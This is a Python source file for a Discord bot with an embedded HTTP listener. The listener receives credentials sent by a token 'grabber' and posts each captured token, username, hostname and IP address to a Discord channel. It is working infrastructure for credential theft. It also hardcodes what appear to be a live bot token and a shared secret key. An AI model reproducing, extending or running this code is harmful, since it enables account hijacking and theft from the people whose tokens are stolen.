import discord
from discord.ext import commands
from aiohttp import web
import asyncio
import json
import os

# ============ CONFIG ============
BOT_TOKEN   = "MTU3MDc3NjMzOTEwNTk3NjQ4MQ.GhT41U.IVSnZ9RxBfHvxFcjGVlDOebAuvGa0RWXOoVFCc"
CHANNEL_ID  = 1570775477163921470
SECRET_KEY  = "a7f3k9m2p8q4r6t1w5x0z3b7n9c2v4s6d"
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8080
# =================================

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)


async def handle_token(request: web.Request) -> web.Response:
    """Grabber yahan POST karega."""
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"status": "bad_json"}, status=400)

    if data.get("key") != SECRET_KEY:
        return web.json_response({"status": "unauthorized"}, status=401)

    channel = bot.get_channel(CHANNEL_ID)
    if channel is None:
        return web.json_response({"status": "no_channel"}, status=500)

    token   = data.get("token", "N/A")
    user    = data.get("user", "unknown")
    host    = data.get("hostname", "unknown")
    ip      = request.remote or "unknown"

    embed = discord.Embed(
        title="🔑 New Token Captured",
        color=0x00ff88,
        description=f"**User:** `{user}`\n**Host:** `{host}`\n**IP:** `{ip}`"
    )
    embed.add_field(name="Token", value=f"```{token}```", inline=False)

    raw = json.dumps(data, indent=2)
    if len(raw) > 1000:
        embed.add_field(name="Raw Data", value=f"```json\n{raw[:990]}\n...```", inline=False)
    else:
        embed.add_field(name="Raw Data", value=f"```json\n{raw}\n```", inline=False)

    try:
        await channel.send(embed=embed)
    except Exception as e:
        return web.json_response({"status": "send_failed", "err": str(e)}, status=500)
    return web.json_response({"status": "ok"})


async def start_http():
    app = web.Application()
    app.router.add_post("/token", handle_token)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, LISTEN_HOST, LISTEN_PORT)
    await site.start()
    print(f"[+] HTTP listener running on {LISTEN_HOST}:{LISTEN_PORT}")


@bot.event
async def on_ready():
    print(f"[+] Logged in as {bot.user} ({bot.user.id})")
    bot.loop.create_task(start_http())


@bot.command()
async def ping(ctx):
    await ctx.send("pong")


bot.run(BOT_TOKEN)